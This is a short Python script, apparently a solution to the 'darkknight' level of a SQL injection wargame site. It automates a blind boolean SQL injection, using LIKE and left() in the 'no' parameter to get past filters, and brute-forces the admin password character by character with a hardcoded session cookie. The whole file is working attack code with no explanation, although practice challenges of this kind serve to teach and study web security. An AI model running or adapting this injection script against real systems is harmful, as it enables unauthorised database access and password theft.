import urllib.request
length=8
pw=""
arr="1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
for i in range(1,9):
	for j in range(0,62):
		url='http://los.rubiya.kr/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=asdf&no=1%20or%20id%20LIKE%20"admin"%20%26%26%20left(pw,{0})%20LIKE%20"{password}{ascii}"'.format(i,password=pw,ascii=arr[j])
		r = urllib.request.Request(url)
		r.add_header("Cookie","PHPSESSID=1a1hlpne9kfc84ivkcmr5pd011")
		data = urllib.request.urlopen(r).read().decode("utf-8")
		print(url)
		if data.find("Hello admin") != -1 :
			pw = pw + arr[j]
			print("This is    "+arr[j])
			break
print(pw)